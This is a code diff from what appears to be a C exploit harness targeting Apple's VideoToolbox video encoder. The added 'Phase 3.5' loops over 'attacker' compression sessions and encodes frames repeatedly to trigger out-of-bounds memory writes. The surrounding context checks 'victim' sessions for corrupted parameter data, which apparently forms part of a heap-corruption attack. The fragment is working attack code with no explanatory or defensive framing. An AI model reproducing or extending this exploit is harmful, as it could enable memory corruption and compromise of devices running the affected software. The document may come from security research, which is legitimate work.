@@ -8519,6 +8519,29 @@ vps_cd_done:
         }
         rlog("Attackers: %d / %d\n\n", attack_count, freed);
 
+        /* Phase 3.5: Aggressively encode on attackers to trigger OOB writes */
+        rlog("--- Phase 3.5: Trigger OOB writes (encode attackers) ---\n");
+        {
+            int total_oob = 0;
+            for (int round = 0; round < 10; round++) {
+                for (int t = 0; t < freed; t++) {
+                    if (!attackers[t]) continue;
+                    g_encode_done = 0;
+                    CVPixelBufferRef pb = create_pb(vw, vh);
+                    if (pb) {
+                        VTCompressionSessionEncodeFrame(attackers[t], pb,
+                            CMTimeMake(round * freed + t, 30),
+                            kCMTimeInvalid, NULL, NULL, NULL);
+                        VTCompressionSessionCompleteFrames(attackers[t], kCMTimePositiveInfinity);
+                        for (int ww = 0; ww < 50 && !g_encode_done; ww++) usleep(10000);
+                        CVPixelBufferRelease(pb);
+                        total_oob++;
+                    }
+                }
+            }
+            rlog("Completed %d OOB-triggering encodes across %d attackers\n\n", total_oob, attack_count);
+        }
+
         /* Phase 4: Re-encode ALL surviving victims and compare VPS */
         rlog("--- Phase 4: Re-encode victims, check VPS corruption ---\n");
         int checked = 0, corrupted = 0, lost_fmt_count = 0;
